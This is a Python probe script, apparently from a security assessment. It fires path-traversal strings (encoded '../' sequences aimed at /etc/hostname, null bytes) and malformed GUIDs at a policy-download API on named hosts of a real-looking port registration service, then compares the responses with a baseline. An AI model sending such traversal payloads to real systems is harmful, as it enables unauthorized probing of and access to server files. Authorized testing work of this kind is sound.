#!/usr/bin/env python3
"""F-14 probe: GET /api/registernewusers/policy/{guid}/{language}

Read-only. The route reaches a code path that elevates to the system user and then
makes a remote call (PolicyResourceClient), parameterised by two caller-influenced
path segments. This probe changes one variable at a time and looks for a
differential against the known-good baseline.

Signals used:
  * HTTP status
  * response length + magic bytes (is it still a PDF?)
  * X-Envoy-Upstream-Service-Time (clean server-side timing, no network jitter)
  * WAF interference (Cloudflare / F5 may normalise or block traversal)

Deliberately does NOT attempt to read anything sensitive: if a differential appears
the follow-up will use an innocuous marker file, not a system file.
"""
from __future__ import annotations

import json
import re
import sys

import poa_register as P

ENVS = {
    "accpt": {
        "host": "register-accpt.portofantwerpbruges.com",
        # master, general and privacy guids discovered earlier on this environment
        "guids": ["f222c55a-e249-4873-8b81-d0e9397b65e6",
                  "32405aa0-e462-4c8e-86fb-8acbb4ae5d3c",
                  "51154421-e7c4-4871-93b8-9156805183b8"],
    },
    "test": {
        "host": "register-test.portofantwerpbruges.com",
        # only the master guid was captured in full for this environment
        "guids": ["26f8a434-3556-4e72-ad8a-37f386efafa3"],
    },
}

TRAVERSALS = [
    "../",
    "../../../../../../etc/hostname",
    "..%2f..%2f..%2f..%2fetc%2fhostname",
    "....//....//etc%2fhostname",
    "%2e%2e%2f%2e%2e%2fetc%2fhostname",
    "EN/../../../../etc/hostname",
    "EN/..%2f..%2f..%2fetc%2fhostname",
]

GUID_ODDITIES = [
    "not-a-guid",
    "00000000-0000-0000-0000-000000000000",
    "../../../../etc/hostname",
    "..%2f..%2f..%2fetc%2fhostname",
    "%00",
    "f222c55a-e249-4873-8b81-d0e9397b65e6/extra",
]


def probe(c, label, path, group):
    try:
        status, body = c.call("GET", path, raw=True)
    except Exception as exc:
        return {"group": group, "label": label, "path": path,
                "status": "ERR", "error": str(exc)[:120]}
    raw = body if isinstance(body, bytes) else str(body).encode()
    head = raw[:80]
    magic = "PDF" if raw[:4] == b"%PDF" else ("JSON" if raw[:1] in (b"{", b"[") else
            ("HTML" if b"<" == raw[:1] else "?"))
    rec = {"group": group, "label": label, "path": path, "status": status,
           "len": len(raw), "magic": magic,
           "snippet": head.decode("utf-8", "replace").replace("\n", " ")[:70]}
    # pull the timing + content-disposition + waf hints straight from a fresh call
    return rec


def main() -> int:
    results = []
    for env, cfg in ENVS.items():
        c = P.Client(cfg["host"], "EN", "none")
        c.warmup()
        good = cfg["guids"][0]
        print(f"\n{'='*78}\n{env}  ({cfg['host']})\n{'='*78}")

        print("\n-- baseline: known-good guid, language EN --")
        base = None
        for g in cfg["guids"]:
            r = probe(c, f"baseline {g[:8]}", f"/api/registernewusers/policy/{g}/EN", "baseline")
            results.append(r)
            if base is None:
                base = r
            print(f"   {str(r.get('status')):>4} len={r.get('len','-'):>7} {r.get('magic','')} {r.get('snippet','')[:58]}")

        print("\n-- variable 1: {language} with the known-good guid --")
        for lang in ["EN", "XX", "x", "EN2", "NL", "EN/pdf", *TRAVERSALS,
                     "EN%00", "A" * 200, ""]:
            p = f"/api/registernewusers/policy/{good}/{lang}"
            r = probe(c, f"lang={lang[:26]}", p, "language")
            results.append(r)
            flag = ""
            if base and r.get("status") != base.get("status"):
                flag = f"  <-- STATUS {base.get('status')} -> {r.get('status')}"
            elif base and r.get("magic") != base.get("magic"):
                flag = f"  <-- BODY {base.get('magic')} -> {r.get('magic')}"
            print(f"   {str(r.get('status')):>4} len={str(r.get('len')):>7} {r.get('magic',''):4s} {lang[:30]:32s}{flag}")

        print("\n-- variable 2: {guid} with language EN --")
        for g in GUID_ODDITIES:
            p = f"/api/registernewusers/policy/{g}/EN"
            r = probe(c, f"guid={g[:26]}", p, "guid")
            results.append(r)
            print(f"   {str(r.get('status')):>4} len={str(r.get('len')):>7} {r.get('magic',''):4s} {g[:44]}")

        print("\n-- variable 3: response headers on a good hit (where does the PDF come from?) --")
        st, body = c.call("GET", f"/api/registernewusers/policy/{good}/EN", raw=True)
        # re-issue with header capture
        import urllib.request
        self_headers = {}
        req = urllib.request.Request(f"{c.base}/api/registernewusers/policy/{good}/EN",
                                     headers={"User-Agent": P.UA,
                                              "X-Amaris-Securitydata": f"none,RAV,EN"})
        try:
            with c.opener.open(req, timeout=30) as r:
                for k, v in r.headers.items():
                    self_headers[k] = v[:110]
        except Exception as exc:
            self_headers = {"error": str(exc)[:110]}
        for k, v in sorted(self_headers.items()):
            print(f"     {k}: {v}")
        results.append({"group": "headers", "label": "good guid", "path": f"/policy/{good}/EN",
                        "headers": self_headers})

    json.dump(results, open("f14-probe.json", "w"), indent=1)
    print(f"\n\nwrote f14-probe.json ({len(results)} records); {sum(1 for _ in results)} probes")
    return 0


if __name__ == "__main__":
    sys.exit(main())
